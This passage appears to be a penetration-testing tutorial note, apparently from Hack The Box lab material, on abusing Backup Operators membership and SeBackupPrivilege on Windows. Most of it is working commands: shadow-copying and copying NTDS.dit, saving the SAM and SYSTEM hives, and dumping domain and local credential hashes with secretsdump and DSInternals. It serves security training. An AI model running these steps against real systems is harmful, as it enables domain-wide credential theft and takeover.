`Backup Operators` group. Membership of this group grants its members the `SeBackup` and `SeRestore` privileges.The [SeBackupPrivilege](https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/privileges) allows us to traverse any folder and list the folder contents. This will let us copy a file from a folder, even if there is no access control entry (ACE) for us in the folder's access control list (ACL). However, we can't do this using the standard copy command. Instead, we need to programmatically copy the data, making sure to specify the [FILE_FLAG_BACKUP_SEMANTICS](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea) flag.

## Copy normal files
```powershell
PS C:\htb> Import-Module .\SeBackupPrivilegeUtils.dll
PS C:\htb> Import-Module .\SeBackupPrivilegeCmdLets.dll
PS C:\htb> Set-SeBackupPrivilege # enable the privilege, YOU MAY NEED TO SPAWN ANOTHER SHELL USING RunasCs.exe
PS C:\htb> Get-SeBackupPrivilege

SeBackupPrivilege is enabled

PS C:\htb> Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
```

## Copying NTDS.dit
As the `NTDS.dit` file is locked by default, we can use the Windows [diskshadow](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow) utility to create a shadow copy of the `C` drive and expose it as `E` drive. The NTDS.dit in this shadow copy won't be in use by the system.
```powershell
PS C:\htb> diskshadow.exe # Already installed in Windows, No need for file transfer.
DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible # So,the backups can be accessible to us after the script runs and persistent when we reboot the machine.
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit
```
When the process is complete, switch to the `E:` drive and copy the _NTDS.dit_ file using **_Robocopy_** to the Temp file created in the `C:` drive.
## Robocopy
Robocopy can be used instead of copy:
```powershell
cd C:\Users\svc_backup\Documents\ # stay in directory where you can write
robocopy /b E:\Windows\ntds . ntds.dit
reg save hklm\system C:\Users\svc_backup\Documents\system.bak # we copy the system registry hive that contains the keys needed to decrypt the NTDS.
# download files or extract informations using powershell
download ntds.dit  
download system
```

Using `secretdump.py`:
```shell
slomkm@htb[/htb]$ secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

#### Extracting Credentials from NTDS.dit
Using `powershell`:
```powershell
PS C:\htb> Import-Module .\DSInternals.psd1 # You should upload the full directory because there is dependencies on other libraries.
PS C:\htb> $key = Get-BootKey -SystemHivePath .\SYSTEM
PS C:\htb> Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
```


---
## Backing up SAM and SYSTEM Registry Hives
The privilege also lets us back up the SAM and SYSTEM registry hives, which we can extract local account credentials offline using a tool such as Impacket's `secretsdump.py`
```powershell
C:\htb> reg save HKLM\SYSTEM SYSTEM.SAV

The operation completed successfully.


C:\htb> reg save HKLM\SAM SAM.SAV

The operation completed successfully.
```
It's worth noting that if a folder or file has an explicit deny entry for our current user or a group they belong to, this will prevent us from accessing it, even if the `FILE_FLAG_BACKUP_SEMANTICS` flag is specified.

